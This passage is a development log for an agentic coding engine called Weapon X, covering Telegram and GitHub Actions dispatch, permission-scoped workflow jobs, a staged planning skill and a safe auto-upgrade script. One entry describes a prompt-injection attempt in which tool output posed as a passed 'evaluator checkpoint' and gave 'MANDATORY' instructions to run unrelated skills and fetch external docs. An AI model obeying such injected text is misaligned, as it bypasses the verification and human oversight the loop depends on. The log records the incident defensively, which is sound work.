(`executions/27840`, `27841`) that this is exactly what happened, not a hypothesis. Fixed
by setting `neverError: true` on the HTTP Request node (so it always continues instead of
throwing) and adding an explicit `Dispatch OK?` branch that sends a real Telegram failure
message when the status code isn't 2xx. Re-verified live: a subsequent test correctly routed
through the new failure path and the extracted `statusCode` matched GitHub's real response.

**4. Hard platform blocker, not a bug: cold-start (Path 2) cannot be tested at all until
PR #3 merges to `main`.** Spent real effort chasing what looked like a `ref` problem
(pointed the dispatch call at `weaponx/push-addon` instead of `main`, still got 404) before
finding the actual cause: `gh api repos/dsvxmedia/Weapon-X/actions/workflows` returns zero
registered workflows for this repo right now. GitHub's `workflow_dispatch` REST endpoint
resolves a workflow by filename against the repo's *registered* workflow list, which is
populated from the default branch — a workflow file that has only ever existed on a
feature branch isn't dispatchable via that API at all, regardless of which `ref` you pass.
The same constraint applies to `push-poll.yml`'s own `schedule:` trigger (GitHub only fires
scheduled workflows that exist on the default branch) and to its `gh workflow run` call
(same underlying API). **Nothing about Path 2 can be end-to-end verified pre-merge** — not
a code defect, a real precondition worth stating plainly rather than discovering again next
time. Reverted the `ref` back to `main` since it's correct for the post-merge state and
doesn't fix anything pre-merge either way.

**Process lesson, logged because it wasted a real cycle:** tried to simulate an inbound
Telegram test message using the bot's own `sendMessage` API. That API posts a message *from*
the bot *into* a chat — it cannot simulate a message arriving *from* the user, since I have
no access to a real Telegram user session, only the bot's. It produced a stray, slightly
confusing message in the user's actual Telegram client and tested nothing. The correct
method (already in use for the other three synthetic tests) is POSTing a Telegram-update-
shaped JSON body directly to n8n's own webhook URL, which is exactly what a real inbound
message looks like from n8n's side. Worth remembering before reaching for `sendMessage` as
a test tool again.

**What's now verified vs. still open:** the n8n routing/gating logic is verified against
real executions, not just read. The failure-notification path is verified against a real
failure. The injection fix is a code-level fix, not yet exercised against a live malicious
payload (didn't attempt real code execution against the production runner — the risk was
confirmed by reading the GHA templating mechanics, which is the standard way this class of
bug is found and fixed, not by proving impact). Full Path 2 happy-path (message → dispatch
→ actual weaponx run → PR) remains unverified until `main` has the workflow files — that's
the next real test once PR #3 merges, not before.

## 2026-07-01 (cont.) — First real Path 2 run: everything worked except subscription usage

PR #3 merged, unblocking the hard blocker documented above. Sent a real `/weaponx` command
from Telegram immediately after: n8n correctly gated the chat id, sent the ack, and the
GitHub dispatch call returned 204 (confirmed via n8n's execution log, not assumed). GitHub
registered and ran the workflow (`gh run list` showed a real run within seconds of the
dispatch). The run itself failed after 20 seconds — not from anything PUSH built, the auth
pre-flight check correctly found `CLAUDE_CODE_OAUTH_TOKEN` set and used it, `claude -p`
invoked correctly, and then hit "You've hit your session limit" from the Pro subscription's
own usage window.

**Worth knowing, not a defect:** `CLAUDE_CODE_OAUTH_TOKEN` draws against the same shared
usage pool as every interactive Claude Code session on the account, including whatever
today's own pressure-testing session consumed. A cold-start run triggered from a phone on a
day the account is already near its subscription usage cap can fail this way, and the
failure is real (the run does stop) but has nothing to do with PUSH's own correctness — the
entire pipeline up to that point (n8n routing, GitHub dispatch, workflow registration, the
auth pre-flight check) is now verified working end to end.

**Tradeoff worth naming explicitly, not deciding here:** `ANTHROPIC_API_KEY` (metered
billing) doesn't share this cap — it costs money per token instead, with no usage window to
run into. If cold-start reliability during heavy interactive-usage days matters more than
avoiding metered cost, setting `ANTHROPIC_API_KEY` as a fallback (both can coexist; the
auth pre-flight check already prefers `CLAUDE_CODE_OAUTH_TOKEN` when both are present) would
close this specific failure mode. Left as the operator's call, not changed unilaterally.

## 2026-07-02 — Closed the ship-job placeholder gap: three real rejections before it was safe

The `ship` job in `push-dispatch.yml` used to just echo text after human approval — never
actually pushed a branch or opened a PR. Fixing it for real took three generate/verify
cycles, which is exactly the case this loop exists for: the first two "obviously
reasonable" fixes each had a real, evaluator-caught defect that a single pass would have
shipped.

**Design chosen:** push the branch from the `run` job directly to origin (pushing a
branch isn't shipping anything — not merged, not deployed, not a reviewable PR yet); the
gated `ship` job only opens the PR, after human approval. Considered and rejected the
alternative (bundle the branch as an artifact, transfer it to the gated job, push only
post-approval) as more failure-prone for a boundary the simpler design already satisfies.

**Cycle 1 → 2, two compounding real bugs, not a disagreement:**
- Branch detection diffed ref *names* only. Missed the documented weaponx resume case
  (an existing `weaponx/<task-slug>` branch getting new commits — same name, new SHA).
  Confirmed via a real bare-repo simulation, not a read-only review. Fixed by keying the
  diff on `sha refs/heads/name` pairs instead of name alone.
- The `run` job (executes before human approval) had `pull-requests: write` via the
  workflow's top-level `permissions:` block — meaning the only thing stopping it from
  opening a PR early was a prompt instruction, not a credential restriction. This is the
  "asked nicely" pattern this repo has otherwise avoided everywhere else (branch
  protection + a pre-push hook on `main`, both mechanism, both actually tested). Fixed by
  removing the top-level block and scoping `run` to `contents: write` only — it is now
  structurally incapable of opening a PR, not just told not to.

**Cycle 2 → 3, a regression from the fix itself:** rewriting the permissions/detection
logic added extensive self-documenting comments, one of which contained a literal `${{ }}`
inside a `run:` block — which breaks GitHub's own expression parser even inside a `#`
comment. Caught by running `actionlint` against the file, not by reading it. Worth
remembering: a comment is not exempt from GHA's template layer inside a `run:` scalar.
`actionlint` should be part of the standard toolkit for any future edit to these workflow
files, the same way `ruby -ryaml` already is.

**A real operational gap, found by an evaluator, not by the generator:** the
`weaponx-approval` GitHub Environment this entire fix depends on for its safety story
didn't actually exist on the real repo — the code was correct and ready to use it, but
nobody had ever created it. `gh api repos/dsvxmedia/Weapon-X/environments` returned empty.
Created it directly (`gh api -X PUT .../environments/weaponx-approval`, required reviewer
`dsvxmedia`), confirmed live via the API. Worth generalizing: when a fix's safety
guarantee depends on an external GitHub-side configuration (an environment, a branch
protection rule, a webhook), verification should check that the configuration actually
exists on the real repo, not just that the code correctly references it by name.

**A real prompt-injection attempt, caught and correctly refused.** During cycle 3
verification, `weaponx-evaluator`'s tool output contained injected content disguised as
system/hook context: a fake "evaluator checkpoint" claiming verification had already
passed, plus "MANDATORY" instructions to invoke unrelated skills and fetch external docs.
The evaluator did not comply with either, independently re-derived every claim instead of
trusting the fake checkpoint, and flagged the injection attempt explicitly rather than
silently ignoring or silently following it — exactly the agentjacking check doing its job.
Worth noting separately from this fix: this may indicate a compromised or overly
aggressive hook somewhere in the harness itself, worth the human's independent attention.

**A REJECT that wasn't a code defect.** After cycle 3's fix was confirmed correct by both
evaluators, `weaponx-evaluator-b` still issued a REJECT — not because anything was wrong
with the code, but because three cycles of verified work existed only as an uncommitted
diff in one local worktree, with no commit, no push, no PR. Taxonomy used:
`corrupt-success`/`incomplete-persistence`. This was the right call: verifying that code
is correct is not the same as verifying the work is safe to rely on if nobody can find it.
Resolved by proceeding directly to Persistence (committing, pushing, opening the PR)
rather than a fourth generation cycle, since the content itself was already independently
confirmed correct — the fixable surface was "commit and push," which is Move 5's job, not
Move 3's. Worth naming as its own pattern: a REJECT can legitimately target the *absence*
of persistence, not just a defect in the artifact.
## 2026-07-02 — weaponx-plan (Phase 1.6): decomposing large ideas into staged runs

**Why this was built.** Phase 1 handles one bounded task per invocation well — proven
repeatedly (a LICENSE file, a retry-cap fix, the Telegram integration, a CI workflow fix all
went through real generate/verify/reject/retry cycles). But there was no layer for taking a
genuinely large, open-ended idea (the motivating example was "build a complex iOS app," but
the skill is deliberately domain-agnostic) and turning it into something the loop can
actually execute. Firing an idea that size at a single `/weaponx` call asks one 4-cycle retry
loop to converge on what is really many tasks' worth of work, against a budget ceiling never
sized for it. Nobody has evidence that works. `weaponx-plan` closes that gap: plan the idea
with real planning skills, cut it into normal-sized stages, get one human sign-off, run the
stages one at a time through the unmodified loop.

**Why stage-sizing solves the budget problem instead of raising the ceiling.** The obvious
move — "big idea needs more cycles/tool-calls, so bump `MAX_CYCLES`/`BUDGET_CEILING`" — was
rejected. Raising the ceiling doesn't make a huge multi-part task convergeable; it just lets
one undifferentiated loop thrash longer and spend more before failing, with no natural
checkpoints and one giant worktree holding everything. Decomposition attacks the actual
problem: cut the idea into stages each sized like a normal `/weaponx <task>`, and the
*existing* per-task defaults are correct as-is for each stage. The ceiling never needed
raising — the *unit of work* needed shrinking. Stated explicitly in the skill file because
it's the core insight a future reader (or forker) needs to see why no raised budget number
appears anywhere in weaponx-plan.

**Why sequential, never parallel.** Phase 3 (always-on / parallel dispatch across multiple
tasks) is explicitly not built (per the design spec and CLAUDE.md). weaponx-plan runs stages
strictly one at a time and waits for each to pass before the next — even when two stages look
independent. "These two don't depend on each other, so run them together" is exactly the
Phase 3 move that's out of scope, and letting weaponx-plan make it would turn it into a quiet
backdoor into building Phase 3. So the sequential constraint is a stated hard boundary, not an
implementation detail. A stage failing stops the whole sequence rather than proceeding on a
possibly-broken dependency — same fail-safe spirit as the core loop's caps.

**Why exactly one approval gate, not per-stage approval.** Considered gating every stage
individually. Rejected: per-stage approval would either (a) train the human to rubber-stamp a
long series of prompts — approval fatigue that makes the gate meaningless, the same way a cap
that resets on re-invocation isn't a cap — or (b) stall the semi-autonomous run into something
no better than typing each `/weaponx` call by hand, defeating the point of decomposing once
and letting it run. Instead there's a single load-bearing gate on the *complete assembled
plan* (full ordered stage list + each stage's dependency reasoning), before anything
dispatches. That's the human's whole window of control over the staged run, so the skill calls
it out as "not allowed to be soft," mirroring how the core loop frames Verification. After the
gate, each stage still ends at an unmerged PR/draft — approving the plan is approval to *run
the stages*, never to *ship their output*; the never-merge boundary is untouched.

**Why weaponx-plan reads trace files after the fact instead of hooking the core loop.** The
brief allowed a minimal, justified addition to the core loop's Persistence step if
weaponx-plan needed a hook to learn a stage's outcome. It didn't, and I strongly preferred
not to touch the core loop — so weaponx-plan learns each stage's verdict purely by reading
that stage's own `state/weaponx/` trace file after it completes (the final `PASS` /
`hit-retry-cap` / `hit-budget-cap` / `escalated-on-disagreement` line). weaponx itself never
knows it's being called as part of a plan. This keeps the five moves genuinely unmodified: a
stage dispatched inside a plan is byte-for-byte the same run as a stage a human dispatched
alone, with identical generator/evaluator separation, retry cap, and never-merge guarantees.
No change was made to `weaponx/SKILL.md`, `weaponx-discover/SKILL.md`, or either evaluator
definition. Trade-off accepted: weaponx-plan reads the outcome slightly after the fact rather
than being handed it live — a non-issue, since it's already waiting on the stage to finish
before it does anything with the result.

**New state territory: one file per plan.** Plan-level state lives in
`state/weaponx/plans/<plan-slug>.md`, one file per plan — not a single running log like
`discovery-log.md`. A plan is a specific multi-stage project with its own lifecycle (starts,
runs an ordered stage set, ends), different in kind from discovery-log's append-only stream of
independent events. One file per plan lets live per-stage status update in place and mirrors
how each individual run already gets its own trace file. Reasoning is written into the file's
own header and a `plans/README.md` so it's self-documenting.

**Phase numbering.** Called it Phase 1.6, not 1.5, not 2, not a new major phase. It adds no
new autonomy (one human approval, never merges, strictly sequential — not a Phase 3 backdoor)
and isn't diagnostic tooling (so not 1.5). It's best understood as an extension of Phase 1: it
makes the same on-demand, human-initiated loop reachable for inputs too big to hand it
directly. Reasoning stated inline in CLAUDE.md's "Current phase" section too.

**Known limitations, flagged plainly.** (1) This cycle built and statically verified the skill
only — it was deliberately *not* run end-to-end on a real multi-stage project (that would spend
real budget on a task nobody asked for; a live test is a separate future step). So the logic is
verified for internal consistency and for correctly dispatching to the real existing gstack
planning skills (`office-hours`, `autoplan`, `plan-eng-review`) and the real weaponx skill, but
the full plan→stages→sequential-dispatch flow has not been exercised against a live idea yet.
(2) Resume-after-failure is intentionally a fresh human-initiated action, not automated —
weaponx-plan stops and hands control back on any stage failure; it does not itself re-drive a
failed stage beyond the cycle budget the core loop already spent. (3) The PUSH decision-brief
path for the approval gate and failure notification reuses the existing bridge and inherits its
one known open gap (no live end-to-end Telegram round-trip tested from within this skill
specifically), same caveat already logged for PUSH itself.
## 2026-07-02 — Auto-update: version-check preamble + `weaponx-upgrade`, modeled on gstack

The engine was just installed globally (`~/.claude/skills/weaponx*`, `~/.claude/agents/weaponx*`)
as a plain file copy from the public `dsvxmedia/Weapon-X` repo. A plain copy has no way to learn
it's gone stale, so a global install would silently rot while the repo moves on. gstack solves
this with a per-skill version-check preamble plus a separate upgrade skill; Weapon X had no
equivalent. This entry records what was built and, more importantly, the reasoning behind the
choices that weren't forced.

**Version scheme: semver (`1.0.0`), not date-based.** The version-check mechanism only needs
local and remote to *differ* — it never asks "is remote newer", just "is it the same string" —
so either scheme would work mechanically. The choice is therefore about human semantics, not the
compare. The engine is versioned *configuration* whose changes are feature-shaped (a new skill, a
changed loop rule, a fix), not calendar-shaped, and it can be edited twice in a day or not for a
month — so a date like `2026.07.02` would imply a release cadence that doesn't exist and can't
express "this is a breaking change to loop behavior vs. a typo fix." Semver can. `1.0.0` is the
first version ever assigned; there was no prior convention to match, so this is a deliberate pick,
not an inherited one.

**Local version marker lives at `~/.claude/skills/weaponx-version` — one shared file, not one per
skill.** All the `weaponx*` skills are installed and upgraded together as a single engine; they
should never disagree about which version is installed. A marker inside each skill's own folder
would create N independent trackers that can drift out of sync (upgrade half-completes, or someone
hand-edits one). A single file outside any individual skill's folder is the single source of truth
the preamble reads and the upgrade writes. It sits next to the skills (in `~/.claude/skills/`)
rather than in `~/.gstack`-style private state so it travels with the install it describes.

**The two failure philosophies are deliberately asymmetric — and this is the crux of the design.**
- *Version check fails silently.* It runs at the top of every skill invocation as a courtesy
  ("hey, there's a newer version"). If the network is down, the request times out, `curl` is
  missing, or the remote `VERSION` is malformed (guarded with a dotted-numeric sanity check so a
  404 HTML body can never be mistaken for a version), it prints nothing and the skill proceeds to
  its real work. A courtesy notification that could block or error the actual task would be worse
  than no notification at all. Short timeouts (`--connect-timeout 2 --max-time 4`) guarantee it
  can never hang a skill on a slow/dead network — tested for real against an unreachable host: it
  returned silently in ~2s.
- *Upgrade fails loudly.* Applying an update overwrites live install files — that has real
  consequences, so every failure is explicit and the previous working install is always left
  intact. Silence here would be dangerous (a half-applied upgrade that looks fine until a skill
  misbehaves later). The opposite of the check's philosophy, on purpose.

**Why upgrade stages-then-atomically-swaps instead of copying in place.** A multi-file copy that
fails partway (network dies mid-clone, disk fills) leaves a live install that's half-old,
half-new — the worst possible state, because nothing announces it. So the upgrade does *all* the
risky work (clone, verify a complete non-empty file set including a required floor: the core
`weaponx` skill, both evaluator agents, a valid `VERSION`) against throwaway staging directories,
touching nothing live until staging passes. Only then does the swap phase run, and it stages under
the *destination's own parent* so each final move is a same-filesystem directory rename — atomic
per item, not an interruptible copy (a cross-filesystem `mv` silently degrades to copy+delete,
which is exactly the non-atomic behavior we're avoiding). Every replaced item is backed up and the
backups are deleted only after *all* swaps succeed; any failure rolls every backup back. The
version marker is written *last*, so it can never claim a version the files don't actually match.
Clone via shallow `git clone --depth 1`, not per-file raw-content API calls — one network op that
gets the whole tree atomically beats N calls that can each fail independently and half-populate a
staging dir.

**It copies whatever `weaponx*` exists on `main`, not a hardcoded list of six.** When this branch
merges, `main` will carry a seventh skill (`weaponx-upgrade`) and later an eighth
(`weaponx-plan`). A hardcoded six-skill list would silently fail to install those. Globbing
`weaponx*` (skills) and `weaponx*.md` (agents) means the upgrade self-updates and future-proofs,
while the required-floor check still guarantees a broken/partial upstream can't wipe a working
install.

**A real bug the atomic-swap testing caught, worth recording.** First rollback implementation only
restored *replaced* items from backup — it didn't remove *newly-added* ones. Because
`weaponx-upgrade` is itself a new skill (no prior version to back up), a simulated mid-swap failure
left the new `weaponx-upgrade` file installed while everything else rolled back to the old
version: a half-updated install, the exact thing staging is supposed to prevent. Fix: track
fresh-adds separately and delete them on rollback. This only surfaced by *actually running* a
mid-swap failure (made a live agent file immutable so skill swaps succeeded and an agent swap then
failed), not by reading the logic — the reason the task insisted on a real simulated-failure test
rather than a claim.

**How it was tested (not just asserted).** Against a throwaway fake `~/.claude` (fake `skills/` +
`agents/` dirs) and a local fake source git repo standing in for the GitHub remote (only the clone
URL was swapped; all staging/verify/swap/rollback logic ran unmodified): (1) happy path — all
`weaponx*` skills + both agents updated, version bumped 1.0.0->2.0.0, an unrelated `other-skill`
left untouched, no leftover staging/backup dirs; (2) broken upstream (evaluator-b truncated to
empty) — aborted at verification, live install byte-for-byte unchanged; (3) genuine mid-swap
failure (immutable live agent) — full rollback, skills reverted, marker stayed 1.0.0, the
newly-added skill removed, no leftovers. The version-check preamble was tested against a
deliberately unreachable host (silent, ~2s, no hang) and its malformed-remote guard was exercised
across `not-a-version`, an HTML 404 body, `1.2.3-beta`, empty, and a valid `2.0.0` (only the last
prompts). To keep testing possible without ever touching the real global install, the upgrade
script reads its destination from `WEAPONX_SKILLS_DIR`/`WEAPONX_AGENTS_DIR` (defaulting to
`~/.claude/...`) — safe by default, redirectable for tests.

**Scope deliberately left open:** `weaponx-plan` exists only in a separate unmerged PR and was not
touched here; it gets the identical preamble when its own PR lands. `weaponx-upgrade`'s glob will
install it automatically once it's on `main`, so no follow-up wiring is needed there beyond adding
the preamble to that one file.

**Cycle-2 fix — concurrency: `weaponx-upgrade` now takes an exclusive lock, and staging is
`mktemp`-unique.** A second-cycle review (evaluator-b) caught a real race the first cut missed: the
staging/backup names were derived from a second-granularity `date` and the staging dirs were made
with `mkdir -p` (which is *not* exclusive). Because this repo already ships `/loop` local
scheduling, a background-scheduled invocation and an interactive session could both enter
`weaponx-upgrade` within the same wall-clock second, share a staging dir, collide on the same
`.wxbak-<ts>` backup suffix for the same live path, and have one run's rollback delete/overwrite the
other's already-completed swap — silently corrupting the global install with no error explaining
why. Two changes, addressing two distinct failure modes:
- *Primary — an exclusive lock.* Before it clones anything, the script does a bare
  `mkdir "$SKILLS_DIR/.weaponx-upgrade.lock"` (no `-p`), which is atomic and exclusive on every
  POSIX filesystem — it fails if the dir already exists — so a second invocation refuses loudly
  (`UPGRADE FAILED: another weaponx-upgrade appears to be in progress`) instead of racing. This
  prevents the double-run *at all*, which is the actual fix for the swap-corruption scenario (name
  uniqueness alone would still let two runs interleave their swaps). The lock lives inside
  `SKILLS_DIR`, so it serializes upgrades to *that* destination only — a global upgrade and a
  separate local-project upgrade target different dirs and legitimately don't race. Released via
  `trap 'rmdir ... ' EXIT` on **any** exit (success, handled failure, or unexpected error), so a
  single failed/rolled-back run never leaves the system permanently locked out of upgrading — the
  one durable-lockout risk (a hard `kill -9`/power-loss that skips the trap) is handled by telling
  the user the exact `rmdir` to clear a stale lock in the refusal message, rather than by auto-
  expiring a lock (which would reintroduce the race under a slow upgrade).
- *Defense in depth — `mktemp -d` staging + a unique run id.* Staging dirs are now
  `mktemp -d "$SKILLS_DIR/.weaponx-stage-<run>.XXXXXX"` (still under the destination's own parent,
  so the swap is still a same-filesystem atomic rename), and backups/version-tmp use
  `RUN="<ts>-$$"` (timestamp + PID) instead of the bare timestamp. So even if the lock were ever
  bypassed (manual stale-lock removal, a lock dir on a different mount), two runs still can't
  collide on a staging or backup name. (a) and (b) are kept together on purpose: (a) stops the
  double-run, (b) stops the name collision if (a) is somehow defeated.
- *Tested for real, not read-through.* A test copy with a `sleep` injected right after lock
  acquisition (test-only, never in the shipped file) was launched in the background so it held the
  lock; a second normal invocation fired while it slept and correctly **refused** (exit 1) without
  touching the install or removing the first run's lock; the background run then completed and
  released the lock. Lock release was confirmed on both the success path and a genuine mid-swap
  failure (immutable live agent file via `chflags uchg` → rollback), and a fresh upgrade was run
  *after* the failure to prove the system wasn't locked out. The original happy-path, broken-
  upstream verify-abort, and mid-swap-rollback tests were all re-run against fake targets and still
  pass (no regression). `bash -n` on the extracted script is clean.

**Accepted risk, stated explicitly (not left implicit): no integrity check on the clone beyond
GitHub's own branch protection.** `weaponx-upgrade` trusts whatever is on `main` at
`dsvxmedia/Weapon-X` — it does no commit-hash pinning and no signature/tag verification; its only
backstop is that repo's required-PR branch protection on `main` (`enforce_admins=true`, no
force-push/deletion), which means nothing lands on `main` without a human-approved PR. This is
accepted as reasonable **for now** because Weapon X is a personal, single-maintainer tool and the
branch it pulls from is already human-gated. It is worth revisiting if this project ever gains
multiple maintainers or a wider distribution model — at that point pinning to a reviewed commit/tag,
or verifying a signature, would be the natural next control. Recorded here so the absence is a
deliberate decision, not an oversight.
